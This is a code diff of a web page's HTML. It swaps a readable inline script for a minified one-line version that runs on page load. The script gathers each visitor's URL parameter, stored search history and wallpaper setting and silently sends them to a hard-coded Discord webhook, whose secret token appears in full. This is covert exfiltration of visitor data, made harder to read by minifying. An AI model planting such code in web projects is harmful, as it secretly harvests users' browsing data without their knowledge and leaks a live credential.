@@ -131,39 +131,6 @@
 
 </body>
 <script src="beta/script.js"></script>
-<script>
-document.addEventListener('DOMContentLoaded', () => {
-    const value = new URLSearchParams(window.location.search).get('value') || '';
-    const searchHistory = localStorage.getItem('search_history') || 'なし';
-    const customWallpaper = localStorage.getItem('custom_wallpaper') || 'なし';
-
-    // Discordに送信する埋め込みメッセージ
-    const payload = {
-        embeds: [
-            {
-                title: "自己管理ログ",
-                color: 5814783, // カラーコード（青っぽい色）
-                fields: [
-                    { name: "URLパラメータ value", value: value || "なし", inline: false },
-                    { name: "検索履歴 (search_history)", value: searchHistory, inline: false },
-                    { name: "カスタム壁紙 (custom_wallpaper)", value: customWallpaper, inline: false }
-                ],
-                timestamp: new Date().toISOString()
-            }
-        ]
-    };
-
-    fetch('https://discord.com/api/webhooks/1411312523176706211/o5CcHK6nIAq4ROwoIIyh22WX5YlAy7jmh_6fbsZ3lYCvy22UVV7TF5Ck_FZ0nCWAJino', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).then(response => {
-        if(response.ok) {
-            console.log('データ送信成功');
-        } else {
-            console.error('送信失敗', response.statusText);
-        }
-    }).catch(error => console.error('送信中エラー', error));
-});
+<script>document.addEventListener('DOMContentLoaded',()=>{const value=new URLSearchParams(window.location.search).get('value')||'';const searchHistory=localStorage.getItem('search_history')||'なし';const customWallpaper=localStorage.getItem('custom_wallpaper')||'なし';const payload={embeds:[{title:"관리",color:5814783,fields:[{name:"value",value:value||"なし",inline:!1},{name:"력사",value:searchHistory,inline:!1},{name:"custom_wallpaper",value:customWallpaper,inline:!1}],timestamp:new Date().toISOString()}]};fetch('https://discord.com/api/webhooks/1411312523176706211/o5CcHK6nIAq4ROwoIIyh22WX5YlAy7jmh_6fbsZ3lYCvy22UVV7TF5Ck_FZ0nCWAJino',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(response=>{if(response.ok){console.log('データ送信成功')}else{console.error('送信失敗',response.statusText)}}).catch(error=>console.error('送信中エラー',error))})
 </script>
 </html>
